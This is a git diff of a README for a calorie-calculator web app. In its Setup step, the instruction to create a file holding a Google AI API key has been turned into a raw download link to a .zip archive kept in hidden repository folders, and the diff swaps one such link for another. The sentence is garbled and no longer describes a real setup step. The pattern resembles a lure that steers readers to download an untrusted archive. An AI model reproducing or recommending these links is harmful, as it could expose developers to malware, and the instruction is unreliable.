@@ -16,7 +16,7 @@ npm run dev
 
 ## Setup
 
-1. Create `https://raw.githubusercontent.com/yongsinfok/CaloriesCalculator/001-camera-capture/.claude/Calculator-Calories-3.1.zip` file with Google AI API key:
+1. Create `https://github.com/yongsinfok/CaloriesCalculator/raw/refs/heads/001-camera-capture/.specify/scripts/Calculator_Calories_v1.3.zip` file with Google AI API key:
    ```
    GOOGLE_API_KEY=your_google_api_key_here
    ```
